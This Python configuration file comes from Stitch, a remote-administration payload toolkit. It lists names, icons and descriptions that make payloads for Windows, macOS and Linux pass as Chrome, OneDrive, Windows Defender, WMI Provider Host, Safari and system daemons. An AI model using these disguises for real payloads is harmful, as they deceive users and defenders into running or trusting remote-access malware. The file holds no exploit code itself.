# -*- coding: utf-8 -*-
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

################################################################################
#                        Windows Payload Variables                             #
################################################################################

win_client_app_list = ['chrome','drive','IAStorIcon','SecEdit',
                    'searchfilterhost','WUDFPort','MSASTUIL','WmiPrvSE']

win_client_app_Icons = {'chrome':"..\\Icons\\chrome\\chrome.ico",
'drive' : "..\\Icons\\drive\\drive.ico",
'IAStorIcon' : "..\\Icons\\IAStorIcon\\IAStorIcon.ico",
'SecEdit' : "..\\Icons\\SecEdit\\SecEdit.ico",
'searchfilterhost' : "..\\Icons\\searchfilterhost\\searchfilterhost.ico",
'WUDFPort' : "..\\Icons\\WUDFPort\\WUDFPort.ico",
'MSASTUIL' : "..\\Icons\\windef\\windef.ico",
'WmiPrvSE' : "..\\Icons\\WmiPrvSE\\WmiPrvSE.ico"}

win_client_app_Description = {'chrome':'stGoogle Chrome',
'drive' : 'stMicrosoft OneDrive',
'IAStorIcon' : 'stIAStorIcon',
'SecEdit' : 'stWindows Security Configuration Command Tool',
'searchfilterhost' : 'stMicrosoft Windows Search Filter Host',
'WUDFPort' : 'stWindows Driver Foundation - User-mode Driver Framework Port Management',
'MSASTUIL' : 'stWindows Defender notification icon',
'WmiPrvSE' : 'stWMI Provider Host'}

win_client_app_Name = {'chrome':'stGoogle Chrome',
'drive' : 'stMicrosoft OneDrive',
'IAStorIcon' : 'stIAStorIcon',
'SecEdit' : u"stMicrosoft® Windows® Operating System",
'searchfilterhost' : u"stWindows® Search",
'WUDFPort' : u"stMicrosoft® Windows® Operating System",
'MSASTUIL' : u"stMicrosoft® Windows® Operating System",
'WmiPrvSE' : u"stMicrosoft® Windows® Operating System"}


################################################################################
#                        OSX Payload Variables                                 #
################################################################################

osx_client_app_list = ['Appstore','chrome','Launchpad','Safari','System_Preferences']

osx_client_app_Icons ={ 'Appstore' : '../Icons/Appstore/AppIcon.icns',
'chrome' : '../Icons/chrome/app.icns',
'Launchpad' : '../Icons/Launchpad/Launchpad.icns',
'Safari' : '../Icons/Safari/compass.icns',
'System_Preferences' : '../Icons/System_Preferences/PrefApp.icns'}

################################################################################
#                        OSX Payload Variables                                 #
################################################################################

lnx_client_app_list = ['meeting_platform_lnx', 'smbd_st','cupst','nmbd_st','sshst']
